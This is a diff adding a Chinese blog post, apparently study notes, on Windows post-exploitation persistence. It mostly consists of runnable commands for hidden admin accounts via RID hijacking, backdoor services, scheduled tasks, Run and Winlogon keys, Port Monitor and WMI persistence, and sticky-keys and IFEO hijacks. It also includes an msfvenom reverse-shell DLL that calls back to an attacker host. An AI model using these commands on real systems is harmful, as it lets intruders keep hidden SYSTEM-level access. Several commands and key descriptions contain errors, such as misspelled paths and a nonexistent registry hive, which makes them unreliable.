@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yuBetter">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://example.com/2023/05/15/内网权限持久化/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="当获得到服务器的控制权后，为了防止服务器管理员发现和修补漏洞而导致的服务器权限的丢失，往往需要采取一些手段来实现对目标服务器的持久化访问 常见的系统后门技术创建影子账户影子账户—隐藏的账户，无论怎样都看不到。只有在注册表中才能看到信息 创建影子账户实践1.在目标主机中输入以下命令，创建一个名为Hacker$的账户 net user Hacker$ hacker@123 &#x2F;add">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网权限持久化">
+<meta property="og:url" content="https://example.com/2023/05/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="当获得到服务器的控制权后，为了防止服务器管理员发现和修补漏洞而导致的服务器权限的丢失，往往需要采取一些手段来实现对目标服务器的持久化访问 常见的系统后门技术创建影子账户影子账户—隐藏的账户，无论怎样都看不到。只有在注册表中才能看到信息 创建影子账户实践1.在目标主机中输入以下命令，创建一个名为Hacker$的账户 net user Hacker$ hacker@123 &#x2F;add">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093442598.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093846338.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103733030.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103923408.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322170426739.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172521990.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172505028.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324084138795.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324220115568.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325140257148.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325144331155.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325162902673.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163104824.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163210977.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325165120864.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325173750046.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325175329381.png">
+<meta property="article:published_time" content="2023-05-15T01:30:48.000Z">
+<meta property="article:modified_time" content="2023-05-15T01:31:57.420Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093442598.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yubetter.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yubetter.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/yubetter.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            内网权限持久化 -
+        
+        Yu&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/fonts.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[""]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"好好学习，天天向上","subtitle":{"text":["有远大志向而脚踏实地，有障碍失败而不言放弃","静以修生，俭以养德，非淡泊无以明志，非宁静无以致远","即使慢，驰而不息，纵会落后，纵会失败，但一定可以达到他所向的目标","穷且益坚，不坠青云之志","莫不有始，鲜克有终","靡不有初,鲜克有终"],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/yuBetter","instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"left","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Yu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720211001182912.jpg" alt="内网权限持久化" />
+                    <h1 class="article-title-cover">内网权限持久化</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/yubetter-logon.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">yuBetter</span>
+                            
+                                <span class="author-label"></span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-05-15 09:30:48</span>
+        <span class="mobile">2023-05-15 09:30</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-05-15 09:31:57</span>
+            <span class="mobile">2023-05-15 09:31</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>5.4k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>21 Mins</span>
+        </span>
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <p>当获得到服务器的控制权后，为了防止服务器管理员发现和修补漏洞而导致的服务器权限的丢失，往往需要采取一些手段来实现对目标服务器的持久化访问</p>
+<h2 id="常见的系统后门技术"><a href="#常见的系统后门技术" class="headerlink" title="常见的系统后门技术"></a>常见的系统后门技术</h2><h3 id="创建影子账户"><a href="#创建影子账户" class="headerlink" title="创建影子账户"></a>创建影子账户</h3><p>影子账户—隐藏的账户，无论怎样都看不到。只有在注册表中才能看到信息</p>
+<h6 id="创建影子账户实践"><a href="#创建影子账户实践" class="headerlink" title="创建影子账户实践"></a>创建影子账户实践</h6><p>1.在目标主机中输入以下命令，创建一个名为Hacker$的账户</p>
+<p><code>net user Hacker$ hacker@123 /add                #创建隐藏账户Hacker$</code></p>
+<p>其中“$”符号表示隐藏用户的意思，利用命令行无法查看，但是在“控制面板”“计算机管理”等仍然能看到</p>
+<p>且此时这个用户是标准用户，需要进入注册表修改使其成为管理员用户</p>
+<p>2.在注册表编辑器中定位到HKEY_LOCAL_MACHINE\SAM\SAM\右键单击，选择‘权限’命令，将Administrator用户的权限设置为完全控制</p>
+<p>这是由于注册表项的内容在标准用户和管理员用户下都是不可见的</p>
+<p>3.在注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Accout\Users\Names，处选择Administrator用户在左侧找到与右边显示的键值的类型“0x1f4”相同的目录名，即000001F4，复制000001F4中F文件的值</p>
+<p>4.同理，找到隐藏账户的Hacker$相应的目录000003EA ，将他复制的000001F4中的F的值粘贴到他的F中，确认</p>
+<p>原理是：隐藏用户劫持了管理员账户的的RID，从而使Hacker$具有管理员权限</p>
+<p>5.分别选中Hacker$和00003EA并导出，然后运行<code>net user Hacker$ /del</code> 删除</p>
+<p>之后再将导出的注册表到入回去即可</p>
+<h3 id="系统服务后门"><a href="#系统服务后门" class="headerlink" title="系统服务后门"></a>系统服务后门</h3><p>主要原理就是测试人员将对于“自动”的系统服务，测试人员可以将这种服务的启动二进制文件路径改为攻击荷载或者后门程序，当系统和服务重启的时候就可以重新启动，但是得需要管理员权限</p>
+<p>系统服务会自启，所以将路径攻击载荷的路径，服务启动时就会启动攻击载荷</p>
+<h6 id="1-创建系统服务"><a href="#1-创建系统服务" class="headerlink" title="1.创建系统服务"></a>1.创建系统服务</h6><p>执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create Backdoor binpath= &quot;cmd.exe /K C:\Windows\System32\reverse_tcp.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;</span><br><span class="line">binpath后面必须有空格   obj指定运行权限   start指定启动类型</span><br></pre></td></tr></table></figure></div>
+
+<p>reverse_tcp.exe这个利用msf生成并通过shell后门上传，一旦系统服务启动就会连带启动木马后门，实现权限维持</p>
+<h6 id="2-利用现有服务"><a href="#2-利用现有服务" class="headerlink" title="2.利用现有服务"></a>2.利用现有服务</h6><p>利用现有服务路径修改即可，将路径映射至木马文件路径就可以实现木马持续被启动，达到权限维持的目的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用sc config修改binpath二进制选项</span><br><span class="line">也可以修改注册表ImagePath键</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="3-利用svchost-exe启动服务"><a href="#3-利用svchost-exe启动服务" class="headerlink" title="3.利用svchost.exe启动服务"></a>3.利用svchost.exe启动服务</h6><p>简要来说就是Windows中有些进程的启动得依托它才行</p>
+<p>以DLL形式实现，所以可以将可执行文件路径指向svchost.exe，有它调用DLL文件，具体哪个就得是这个服务在注册表的信息决定的了</p>
+<p>举个栗子</p>
+<p>以wuauserv服务为例</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093442598.png"
+                      alt="image-20230322093442598"
+                ></p>
+<p>这个服务的启动路径是由svchost.exe加载DLL实现的</p>
+<p>这之中还有个parameters子项ServiceDLL是表明由哪个DLL文件负责的，就是说这个服务运行时会加载wuaueng.dll文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093846338.png"
+                      alt="image-20230322093846338"
+                ></p>
+<p>注意每个svchost.exe负责一组进程的运行</p>
+<p>svchost.exe的所有服务分组于注册表的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103733030.png"
+                      alt="image-20230322103733030"
+                ></p>
+<p>中</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103923408.png"
+                      alt="image-20230322103923408"
+                ></p>
+<p>攻击的原理就是加载恶意服务到svchost.exe中建立持久化后门，又不是单独运行的，所以隐蔽性特别高</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">攻击步骤</span><br><span class="line">1制作一个后门dll文件</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.81.135 lport=6000 -f dll -o gongji.dll   </span><br><span class="line"></span><br><span class="line">2.上传至目标主机System32目录执行以下命令</span><br><span class="line">先创建一个名为backdoor的服务，然后以svchost加载方式启动，服务分组为netsvc</span><br><span class="line">sc create backdoor binPath= &quot;C:\Windows\Ststem32\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem</span><br><span class="line">然后再将这个服务启动时的加载路径设为后门木马的路径</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\Windows\System32\reverse_tcp.dll&quot;</span><br><span class="line">配置服务描述</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor /v Destription /t REG_sz /d &quot;Windows xxx Service&quot;</span><br><span class="line">配置服务显示名称</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor /v DisplayName /t REG_sz /d &quot;Backdoor&quot;</span><br><span class="line">创建服务新分组netsvc，并将backdoor服务添加进去</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrrntVersion\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d backdoor</span><br></pre></td></tr></table></figure></div>
+
+<p>然后只要系统重启就可以导致木马被重新启动</p>
+<h3 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h3><p>就是让目标主机再指定的周期内自动重复的运行事先准备好的后门</p>
+<p>使用schtasks命令来实现</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN Backdoor /SC daily /ST 08:00 /MO 1 /TR C:\Windows\System\reverse_tcp.exe /RU System /F</span><br><span class="line">表示在主机上创建一个名为Backdoor的任务，并在每天的8点以SYSTEM权限运行</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322170426739.png"
+                      alt="image-20230322170426739"
+                ></p>
+<p>以下命令是创建一个名为Backdoor的计划任务，每60秒运行一次</p>
+<p><code>schtasks /Create /TN  Backdoor /SC minute /MO 1 /TR C:\Windows\System\reverse_tcp.exe /RU System /F</code></p>
+<p>有一点要说明计划任务是在计划任务库中的类似文件目录的形式存储，所有的计划任务都在最内层，为了增加隐蔽性，所以要遵守规范</p>
+<p>执行以下命令，表示在路径下创建一个AppRun的后门</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172521990.png"
+                      alt="image-20230322172521990"
+                ></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172505028.png"
+                      alt="image-20230322172505028" style="zoom: 33%;" 
+                >
+
+
+
+<h3 id="启动项-x2F-注册表键后门"><a href="#启动项-x2F-注册表键后门" class="headerlink" title="启动项&#x2F;注册表键后门"></a>启动项&#x2F;注册表键后门</h3><h6 id="1-系统启动文件夹"><a href="#1-系统启动文件夹" class="headerlink" title="1.系统启动文件夹"></a>1.系统启动文件夹</h6><p>将程序放在启动文件夹中会导致该程序在用户登入时启动</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定用户登入时启动</span><br><span class="line">C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start</span><br><span class="line">C:\C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">所有用户登入时启动</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure></div>
+
+<p>木马放进去就行</p>
+<h6 id="2-运行键（Run-Key）"><a href="#2-运行键（Run-Key）" class="headerlink" title="2.运行键（Run Key）"></a>2.运行键（Run Key）</h6><p>windows中有许多注册表项可以用来设置在系统启动或者用户登陆时运行指定的程序或加载指定DLL文件</p>
+<p>当登陆时，系统就会依次运行位于注册表运行键中的程序</p>
+<p>默认创建以下运行键，如果要修改HKEY_LOCAL_MACHINE下的运行键，需要拥有管理员级别的权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将在当前用户登陆时启动</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">将在所有用户登陆时启动</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure></div>
+
+<p>执行的命令，表示在注册表运行键中添加一个叫backdoor的键，并且指向后门文件的绝对路径</p>
+<p><code>reg add &quot;HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v backdoor /t REG_SZ /D &quot;C:\Windows\System32\reverse_TCP.exe&quot;</code></p>
+<h6 id="3-Winlogon-Helper"><a href="#3-Winlogon-Helper" class="headerlink" title="3.Winlogon Helper"></a>3.Winlogon Helper</h6><p>这个是一个Windows系统组件，处理一系列与用户有关的行为，这些行为在注册表中，并且定义了在Windows登录期间会启动那些进程</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">指定用户登录时执行的和用户初始化程序，默认是userinit.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span><br><span class="line">指定windows身份验证期间执行的程序，默认为explorer.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br></pre></td></tr></table></figure></div>
+
+<p>执行命令</p>
+<p><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /d &quot;C:\Windows\System32\reverse_tcp.exe&quot; /f</code></p>
+<p>注意：在利用这两个键时需要保留原有的程序，可以将后门添加到原有程序后面以“，”分隔就行，并且需要上传到C:\Windows\System32文件夹中</p>
+<h3 id="Port-Monitors"><a href="#Port-Monitors" class="headerlink" title="Port Monitors"></a>Port Monitors</h3><p>打印机后台处理服务负责管理Windows系统的打印作业</p>
+<p>主要是依靠他之中的AddMonitor函数将DLL注入spoolsv.exe进程</p>
+<p>1.通过msf生成一个64位的DLL恶意木马</p>
+<p>2.将这个文件上传到目标主机的C:\Windows\System32目录中</p>
+<p>执行<code>reg add &quot;HKLM\SYSTEM CurrentControlSet\Control\Print\Monitors\TestMonitor&quot; /v &quot;Driver&quot; /t REG_SZ /d &quot;reverse_tcp.dll&quot;</code></p>
+<p>当系统启动的时候，print spooler服务在启动过程会读取Monitors注册表项的所有子键，并且以SYSTEM权限加载Driver键值所指定的DLL文件</p>
+<h2 id="事件触发执行"><a href="#事件触发执行" class="headerlink" title="事件触发执行"></a>事件触发执行</h2><h4 id="利用WMI订阅事件"><a href="#利用WMI订阅事件" class="headerlink" title="利用WMI订阅事件"></a>利用WMI订阅事件</h4><h6 id="1-手动利用"><a href="#1-手动利用" class="headerlink" title="1.手动利用"></a>1.手动利用</h6><h6 id="2-相关辅助工具"><a href="#2-相关辅助工具" class="headerlink" title="2.相关辅助工具"></a>2.相关辅助工具</h6><p>利用Sharp-WMIEvent工具，可以实现持久化功能</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe /c C:\Windows\System32\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>这表示在主机上部署一个永久性的订阅事件，每当用户登录时就会调用，远程主机就会上线</p>
+<p>此外msf还包含一个内置框架也可以通过WMI实现持久性的模块，exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence，支持的选项不同，可以用于在特定的事件触发时在系统上执行任意攻击载荷</p>
+<h4 id="利用系统辅助功能"><a href="#利用系统辅助功能" class="headerlink" title="利用系统辅助功能"></a>利用系统辅助功能</h4><p>一般Windows系统会有许多组合快捷键来达到某种功能如Windows+“+”、Windows+U等</p>
+<p>最常用的时连按五次shift打开粘滞键sethc.exe程序</p>
+<p>通常将cmd.exe伪装成sethc.exe，此方法需要管理员权限</p>
+<h6 id="1-手动利用-1"><a href="#1-手动利用-1" class="headerlink" title="1.手动利用"></a>1.手动利用</h6><p>在高版本Windows中，C:\Windows\System32目录下的文件收到系统的保护，只有TrustedInstaller权限用户才对其中的问价拥有修改和写入权限，所以在这之前需要通过令牌窃取提升至TrustedInstaller权限。</p>
+<p>获取后执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd C:\\Windows\System32</span><br><span class="line">move sethc.exe sethc.exe.bak      将文件sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe            将一个cmd.exe副本伪装成sethc.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>这时候连按五次shift键就可以开启cmd.exe，权限为SYSTEM</p>
+<h6 id="2-RDP劫持"><a href="#2-RDP劫持" class="headerlink" title="2.RDP劫持"></a>2.RDP劫持</h6><h4 id="IFEO注入"><a href="#IFEO注入" class="headerlink" title="IFEO注入"></a>IFEO注入</h4><p>IFEO是Windows系统的一个注册表项，位于HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options中，负责为一些在默认系统环境中运行时可能引发错误的程序执行提供一个特殊的环境设定</p>
+<h6 id="1-Dubugger"><a href="#1-Dubugger" class="headerlink" title="1.Dubugger"></a>1.Dubugger</h6><p>当用户启动计算机后，系统就会在注册表中的IEFO中查询所有的程序的子键，如果存在与该程序名相同的子键就会读取相应的Dubugger键值，如果键值没被设置就不做处理，否则则将键值所对应的路径作为程序的启动路径来代替原始程序</p>
+<p>可以联想到上面的粘滞键，测试人员就可以修改粘滞键注册表信息来创建后门，就不需要TrustedInstaller权限</p>
+<p>执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>向Image File Execution Options注册表项中添加映像劫持子键，并将“Dubugger”的值设置为要执行的程序即可</p>
+<p>然后连按5次就可以成功弹出命令</p>
+<h6 id="2-GlobalFlag"><a href="#2-GlobalFlag" class="headerlink" title="2.GlobalFlag"></a>2.GlobalFlag</h6><p>IFEO还可以指定程序静默退出时启动任意监控程序</p>
